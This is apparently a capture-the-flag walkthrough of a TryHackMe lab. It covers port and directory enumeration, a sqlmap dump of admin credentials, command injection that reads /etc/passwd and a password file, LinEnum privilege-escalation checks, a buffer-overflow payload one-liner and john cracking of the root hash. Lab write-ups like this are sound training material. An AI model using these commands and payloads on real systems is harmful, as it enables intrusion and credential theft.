# The Code caper

[Link to room](https://tryhackme.com/room/thecodcaper)

echo <machine-ip> codcaper.com >> /etc/hosts.com

Host-Enumeration

```nmap
# Nmap 7.80 scan initiated Fri May 29 10:13:06 2020 as: nmap -sV -sC -A -p 1-1000 -oN nmap.txt 10.10.9.78
Nmap scan report for 10.10.9.78
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
|_  256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/29%OT=22%CT=1%CU=39823%PV=Y%DS=2%DC=T%G=Y%TM=5ED1189
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11
OS:NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   183.91 ms 10.9.0.1
2   184.02 ms 10.10.9.78

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 29 10:13:41 2020 -- 1 IP address (1 host up) scanned in 34.69 seconds
```

1. How many ports are open on the target machine?

> 2

2. What is the http-title of the web server?

> http-title of nmap scan

3. What version is the ssh service?

> use nmap -sV to check for versions 

4. What is the version of the web server?

> http-server-header of nmap


## Web Enumeration
1. What is the name of the important file on the server?

```bash
gobuster dir -u http://codcaper.com -w /usr/share/SecLists/Discovery/Web-Content/big.txt -t 40 -x php,html,txt
```
```
===============================================================                                                                                              
2020/06/17 03:36:26 Starting gobuster                                                                                                                        
===============================================================
/administrator.php (Status: 200)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
===============================================================
2020/06/17 03:36:34 Finished
===============================================================
```

## Web Exploitation

```bash
sqlmap -u http://codcaper.com/administrator.php --forms --dump
```
1. What is the admin username?
2. What is the admin password?

```
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+
```

3. How many forms of SQLI is the form vulnerable to?

> 3


## Command Injection

go to codcaper.com/administrator.php and enter the credentials

###### Getting shell by command injection

1. How many files are in the current directory?

> run ls 

2. Do I still have an account?

> cat /etc/passwd and check if pingu exists

3. What is my ssh password?

> find / -name pass and cat it 

Login by ssh as pingu

## LinEnum 

```bash
scp {path to linenum} {user}@{host}:{path}. Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp
```
1. What is the interesting path of the interesting suid file

```
[-] SUID files:
-r-sr-xr-x 1 root papa 7516 Jan 16 21:07 /opt/secret/root
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
```

Syntax error in method 2 , so here is the code without errors
```
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
```
1. What is the root password!

```bash
echo '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' > hash
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```

